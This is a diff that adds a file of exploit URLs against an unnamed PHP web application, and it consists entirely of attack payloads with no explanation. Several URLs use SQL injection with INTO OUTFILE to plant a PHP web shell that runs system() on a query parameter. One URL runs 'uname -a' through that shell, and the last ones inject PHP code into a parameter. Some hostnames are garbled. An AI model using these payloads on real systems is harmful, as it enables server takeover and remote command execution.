@@ -1,0 +1,13 @@
+http://www.example.com/path/inc/attach.php?id=-1&#039; UNION ALL SELECT &#039;&lt;?php system($_GET[cmd])%3b ?&gt;&#039;,2,3,4,5,6,7,8 INTO OUTFILE &#039;/var/www/htdocs/path/rce.php&#039;%23
+
+http://www.example.com/path/index.php?do=profile&amp;user=blabla&amp;box=-1&#039; UNION ALL SELECT &#039;&lt;?php system($_GET[cmd])%3b ?&gt;&#039;,2,3,4,5,6,7,8 INTO OUTFILE &#039;/var/www/htdocs/path/rce.php&#039;%23
+
+http://www.example.com/path/index.php?do=messages&amp;user=blabla&amp;box=-1&#039; UNION ALL SELECT &#039;&lt;?php system($_GET[cmd])%3b ?&gt;&#039;,2,3,4,5,6,7,8 INTO OUTFILE &#039;/var/www/htdocs/path/rce.php&#039;%23
+
+http://www.example.com/path/index.php?do=edit_post&amp;id=-1&#039; UNION ALL SELECT &#039;&lt;?php system($_GET[cmd])%3b ?&gt;&#039;,2,3,4,5,6,7,8,9 INTO OUTFILE &#039;/var/www/htdocs/path/rce.php&#039;%23
+
+http://www.example.com/path/rce.php?cmd=uname -a
+
+http://www.www.example.com.com/path/index.php?do=profile&amp;user=blabla&amp;box=&lt;?php echo &quot;&lt;pre&gt;&quot;; system(&#039;ls&#039;); echo &quot;&lt;/pre&gt;&quot;?&gt;
+
+http://www.www.example.com.com/path/index.php?do=messages&amp;user=blabla&amp;box=&lt;?php echo &quot;&lt;pre&gt;&quot;; system(&#039;ls&#039;); echo &quot;&lt;/pre&gt;&quot;?&gt;
